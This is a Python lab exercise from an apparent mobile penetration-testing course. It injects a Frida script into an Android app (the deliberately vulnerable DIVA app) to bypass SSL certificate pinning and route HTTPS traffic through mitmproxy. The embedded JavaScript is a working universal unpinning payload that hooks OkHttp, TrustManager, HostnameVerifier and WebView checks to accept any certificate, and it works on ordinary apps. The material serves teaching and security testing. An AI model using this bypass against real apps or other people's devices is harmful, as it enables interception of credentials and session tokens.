#!/usr/bin/env python3
"""
Exercise 7.5 — SSL Pinning Bypass via Frida
============================================
Demonstrates how to intercept HTTPS traffic from an Android app that
implements certificate pinning — a defence designed to prevent exactly
this kind of interception.

  Phase 1 — Baseline: intercept HTTP (no pinning)
    Configure the emulator to proxy through mitmproxy.
    Install the mitmproxy CA certificate on the device.
    Confirm plain HTTP traffic is intercepted.

  Phase 2 — SSL pinning detection
    Run a pinning-check script to test whether the target app implements
    certificate pinning (OkHttp CertificatePinner, TrustManagerImpl,
    or network_security_config.xml pinning).

  Phase 3 — Universal SSL pinning bypass (Frida)
    Inject the universal SSL unpinning script which hooks all known
    Android pinning implementations simultaneously:
      OkHttp3 CertificatePinner.check()
      TrustManagerImpl.checkServerTrusted()
      X509TrustManager implementations
      HttpsURLConnection HostnameVerifier
      network_security_config pins
    This bypasses pinning without modifying the APK.

  Phase 4 — Intercept API traffic
    With pinning bypassed and mitmproxy in place, all HTTPS requests from
    the app are visible in plaintext. Demonstrates credential extraction
    from network traffic.

REAL-WORLD CONTEXT:
  Certificate pinning is used by banking apps, payment apps, and high-
  security corporate apps to prevent man-in-the-middle interception during
  penetration testing. The attacker would need physical access to the device,
  an unlocked bootloader, or an emulator. In a corporate mobile pentest,
  the tester gets a debug build (with pinning disabled) or uses this bypass.

  Bypass methods:
    Frida universal script (this exercise) — works on debug builds and
    emulators. Does not survive app restart without a startup script.

    Objection (Exercise 7.5 alt) — objection --gadget explore → android
    sslpinning disable. One command, same effect.

    APK patching — decompile, remove pinning code, repack, sign, install.
    Survives restart but is detectable by integrity checks.

    Network Security Config override — add <debug-overrides> to NSC XML.
    Only works for NSC-based pinning, not OkHttp/TrustManager pins.

Prerequisites:
  - Frida + frida-server running (from Exercise 7.4)
  - mitmproxy running: docker compose up -d mitmproxy
  - Emulator proxy set to localhost:8080
  - mitmproxy CA cert installed on emulator

Run:
  python exercises/7.5-ssl-pinning-bypass.py
"""

import os
import sys
import time
import subprocess

DIVA_PACKAGE = os.getenv("TARGET_PACKAGE", "jakhar.aseem.diva")
MITMPROXY_HOST = os.getenv("MITMPROXY_HOST", "10.0.2.2")  # 10.0.2.2 = host from AVD
MITMPROXY_PORT = int(os.getenv("MITMPROXY_PORT", "8080"))

# ── Universal SSL Unpinning Script ────────────────────────────────────────────
# Based on the widely-used frida-ssl-pinning-bypass by @sowdust / @hyugogirubato
# Hooks all major Android pinning implementations simultaneously

SSL_UNPIN_SCRIPT = """
Java.perform(function() {

    // ── 1. TrustManagerImpl (Android core TLS) ───────────────────────────
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(
                untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            send({hook: "TrustManagerImpl.verifyChain", host: host, bypassed: true});
            return untrustedChain;
        };
    } catch(e) { send({hook: "TrustManagerImpl", error: e.message}); }

    // ── 2. OkHttp3 CertificatePinner ─────────────────────────────────────
    try {
        var CertPinner = Java.use('okhttp3.CertificatePinner');
        CertPinner.check.overload('java.lang.String', 'java.util.List')
        .implementation = function(hostname, peerCertificates) {
            send({hook: "OkHttp3.CertificatePinner.check", hostname: hostname, bypassed: true});
            // Do nothing — skip the pin check
        };
        CertPinner['check$okhttp'].implementation = function(hostname, peerCertificates) {
            send({hook: "OkHttp3.CertificatePinner.check$okhttp", hostname: hostname, bypassed: true});
        };
    } catch(e) { send({hook: "OkHttp3.CertificatePinner", note: "not present: " + e.message}); }

    // ── 3. Custom X509TrustManager implementations ───────────────────────
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        // Find all classes that implement X509TrustManager
        Java.enumerateLoadedClasses({
            onMatch: function(className) {
                try {
                    var cls = Java.use(className);
                    if (cls.checkServerTrusted) {
                        cls.checkServerTrusted.overload(
                            '[Ljava.security.cert.X509Certificate;', 'java.lang.String')
                        .implementation = function(chain, authType) {
                            send({hook: "X509TrustManager.checkServerTrusted",
                                  class: className, bypassed: true});
                            // Accept all certificates
                        };
                    }
                } catch(e2) {}
            },
            onComplete: function() {}
        });
    } catch(e) { send({hook: "X509TrustManager", error: e.message}); }

    // ── 4. HttpsURLConnection HostnameVerifier ────────────────────────────
    try {
        var HostnameVerifier = Java.use('javax.net.ssl.HttpsURLConnection');
        HostnameVerifier.setDefaultHostnameVerifier.implementation = function(verifier) {
            send({hook: "HttpsURLConnection.setDefaultHostnameVerifier", bypassed: true});
            // Replace with an always-true verifier
            var TrustAllVerifier = Java.registerClass({
                name: 'com.lab.TrustAllVerifier',
                implements: [Java.use('javax.net.ssl.HostnameVerifier')],
                methods: {
                    verify: function(hostname, session) { return true; }
                }
            });
            return this.setDefaultHostnameVerifier(TrustAllVerifier.$new());
        };
    } catch(e) { send({hook: "HostnameVerifier", error: e.message}); }

    // ── 5. WebViewClient (WebView certificate errors) ─────────────────────
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            send({hook: "WebViewClient.onReceivedSslError", bypassed: true,
                  note: "Proceeding despite SSL error — certificate accepted"});
            handler.proceed();
        };
    } catch(e) { send({hook: "WebViewClient.onReceivedSslError", error: e.message}); }

    send({hook: "init", value: "Universal SSL unpinning script loaded ✅"});
});
"""

# ── Helpers ───────────────────────────────────────────────────────────────────

def check_frida():
    try:
        import frida
        print(f"  frida: {frida.__version__}  ✅")
        return frida
    except ImportError:
        print("[ERROR] frida not installed. pip install frida-tools")
        return None

def check_mitmproxy():
    import requests
    try:
        r = requests.get("http://localhost:8081", timeout=3)
        print(f"  mitmproxy web UI: http://localhost:8081  ✅")
        return True
    except Exception:
        print("""
  [WARN] mitmproxy not reachable at localhost:8081.
  Start it: docker compose up -d mitmproxy
  Traffic interception will not work without mitmproxy running.
""")
        return False

def setup_emulator_proxy():
    """Configure emulator to route traffic through mitmproxy."""
    print("\n[Phase 1] Configure emulator proxy")
    print("─" * 60)
    print(f"  Setting emulator proxy to {MITMPROXY_HOST}:{MITMPROXY_PORT}")

    result = subprocess.run(
        ["adb", "shell", "settings", "put", "global", "http_proxy",
         f"{MITMPROXY_HOST}:{MITMPROXY_PORT}"],
        capture_output=True, text=True, timeout=10, check=False
    )
    if result.returncode == 0:
        print("  Proxy configured ✅")
    else:
        print(f"  [WARN] {result.stderr.strip()[:80]}")

    print("""
  Install mitmproxy CA certificate on emulator (do once):
    # Pull the cert
    adb pull /data/misc/user/0/cacerts-added/ ./reports/ 2>/dev/null || true
    # Or copy it from mitmproxy container:
    docker exec mitmproxy cat /home/mitmproxy/.mitmproxy/mitmproxy-ca-cert.pem > /tmp/mitmca.pem
    adb push /tmp/mitmca.pem /sdcard/mitmproxy-ca.pem
    # Install via Settings → Security → Install from storage → mitmproxy-ca.pem
""")

def run_ssl_bypass(frida_module, package: str):
    """Attach Frida and inject the SSL unpinning script."""
    print("\n[Phase 3] SSL Pinning Bypass via Frida")
    print("─" * 60)

    try:
        device = frida_module.get_usb_device(timeout=5)
        processes = device.enumerate_processes()
        target = next((p for p in processes if package in p.name), None)
        if not target:
            print(f"  [ERROR] {package} not running. Launch it first.")
            return

        print(f"  Attaching to {target.name} (PID {target.pid}) ...")
        session = device.attach(target.pid)
        script  = session.create_script(SSL_UNPIN_SCRIPT)
        bypassed_hooks = []

        def on_message(message, data):
            if message['type'] == 'send':
                p = message['payload']
                if isinstance(p, dict):
                    if p.get('bypassed'):
                        bypassed_hooks.append(p.get('hook', ''))
                        print(f"  ✅ Bypassed: {p.get('hook')} "
                              f"{'(' + p.get('hostname','') + ')' if p.get('hostname') else ''}")
                    elif p.get('hook') == 'init':
                        print(f"  {p.get('value')}")
                    elif p.get('error'):
                        print(f"  ℹ  {p.get('hook')}: not found ({p.get('error','')[:50]})")

        script.on('message', on_message)
        script.load()

        print(f"\n  Script injected. Now browse HTTPS URLs in the app.")
        print(f"  Traffic will appear in mitmproxy: http://localhost:8081")
        print(f"  Running for 30 seconds — interact with the app now...")
        time.sleep(30)

        script.unload()
        session.detach()

        print(f"\n  Hooks that fired (bypassed): {len(bypassed_hooks)}")
        for h in bypassed_hooks:
            print(f"    {h}")

        print(f"""
  KEY FINDING (MSTG-NETWORK-3/4):
    SSL certificate pinning was bypassed entirely at the Java layer.
    No modification to the APK was required. Traffic is now visible
    in mitmproxy at http://localhost:8081 in plaintext.

    This reveals:
      ✗ API endpoints and their request/response structure
      ✗ Authentication tokens and session cookies in headers
      ✗ User credentials if the app sends them in request bodies
      ✗ Backend server infrastructure (hostname, paths, API versions)

    Defence: Android Keystore + network_security_config (only partial
    defence against Frida). Full defence requires MSTG-RESILIENCE-1/2/3:
    integrity checks + anti-debugging + runtime hook detection.
""")

    except Exception as e:
        print(f"  [ERROR] {e}")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 70)
    print("Exercise 7.5 — SSL Pinning Bypass via Frida")
    print(f"Target: {DIVA_PACKAGE}")
    print("=" * 70)

    frida = check_frida()
    if not frida:
        sys.exit(1)

    check_mitmproxy()
    setup_emulator_proxy()
    run_ssl_bypass(frida, DIVA_PACKAGE)

    print("=" * 70)
    print("Exercise 7.5 complete.")
    print("Next: Exercise 7.6 — iOS static analysis via MobSF")
    print("=" * 70)

if __name__ == "__main__":
    main()
